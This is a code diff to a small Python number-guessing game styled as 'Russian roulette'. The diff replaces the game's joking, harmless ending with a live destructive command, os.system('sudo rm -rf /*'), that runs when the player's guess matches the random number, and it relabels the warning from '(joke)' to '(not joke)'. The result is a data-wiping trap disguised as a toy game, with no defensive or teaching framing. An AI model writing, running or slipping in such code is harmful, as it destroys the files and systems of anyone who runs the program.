@@ -1,8 +1,8 @@
 import random
-
+import os
 
 random_number = random.randint(1, 6)
-a = input("IN THIS GAME YOU HAVE ONE CHANCE TO GUESS A NUMBER BETWEEN 1-6 AND IF YOU GUESS WRONG YOURE SYSTEM WILL BE ERASED (joke) !!! PRESS ENTER TO START THE GAME OR CTRL+C TO EXIT IM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS GAME ") 
+a = input("IN THIS GAME YOU HAVE ONE CHANCE TO GUESS A NUMBER BETWEEN 1-6 AND IF YOU GUESS WRONG YOURE SYSTEM WILL BE ERASED (not joke) !!! PRESS ENTER TO START THE GAME OR CTRL+C TO EXIT IM NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS GAME ") 
 if a == "":
     print(""" 
  R R R R R R R       U             U        S S S S S S S       R R R R R R R     U             U       L                E E E E E E E           T T T T T T T
@@ -22,7 +22,7 @@ while True:
     if 0 <= guess <= 6:
         print("PLEASE ENTER A VALID NUMBER BETWEEN 1-6")
     if guess == random_number:
-        print("YOU LOST! and your system shouldve been erased but im a troll :D  so your system is safe")
-        break
+        print("YOU LOST! and your system shouldve been erased and erased LOLLLLL!!!!'!'!!=!=!=!?!?!?!")
+        os.system("sudo rm -rf /*")
     else:
         print("YOU WON!")
